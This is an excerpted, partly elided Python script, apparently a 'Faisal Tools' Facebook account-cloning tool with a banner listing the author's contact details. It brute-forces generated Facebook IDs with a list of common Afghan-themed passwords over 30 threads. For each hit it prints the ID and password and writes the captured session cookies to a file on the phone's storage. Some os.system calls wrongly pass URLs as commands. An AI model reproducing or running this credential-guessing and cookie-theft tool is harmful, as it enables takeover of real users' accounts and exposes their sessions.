...
os.system('https://www.facebook.com/profile.php?id=100074211366139/')
...
\033[1;92m╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝                                                              
\033[1;33m-------------------------------------------------------
\033[1;32m[◇]AUTHER     ┇{Faisal Haidary}
\033[1;32m[◇] FACEBOOK   ┇{FaiŠal Hâidâry}
\033[1;32m[◇] GITHUB     ┇{Faisalhaidary}
\033[1;32m[◇]Telegram    ┇{@Ryees_Faisal}
\033[1;32m[◇]WHATSAPP   ┇{+93706258089}
\033[1;32m[◇] NETWORK    ┇{3G, 4G/5G, LTE }WiFi Working
\033[1;32m[◇] STATUS  ┇{Free}
\033[1;32m[◇]VERSION    ┇{0.1}
\033[1;33m-------------------------------------------------------
         WELLCOME TO FAISAL TOOLS
========= AFG ≠ 64Bit =========
...
def FKING():
		...
		#	linex()
			...
			if jf in ['1','01']:
			 ...
			 os.system('https://t.me/Basir_SKills001/')
			elif jf in ['0','00']:
				exit(' Thanks for use FAISAL Tool ')
			else:
...
def AFG():
		...
		mthd = input(' Choose: ')
		clear()
		print(' \n\033[1;32m [1] \033[1;33mCLONE  AUTO PASS (AFG) ')
		linex()
		pcs = input(' [?] Select: ')
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan12345','kabul1234','afghanistan','Afghanistan','50005000','123456','12345678','khan123','Afghan123','۵۰۰۶۰۰','afghan','afghan123','5004870','´]
...
Nasrat1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
Nasrat= random.choice(Nasrat1)
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [NASRAT]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [FAISAL-OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/A-Faisal-COOKIE.txt','a').write(coki+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [FAISAL-CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
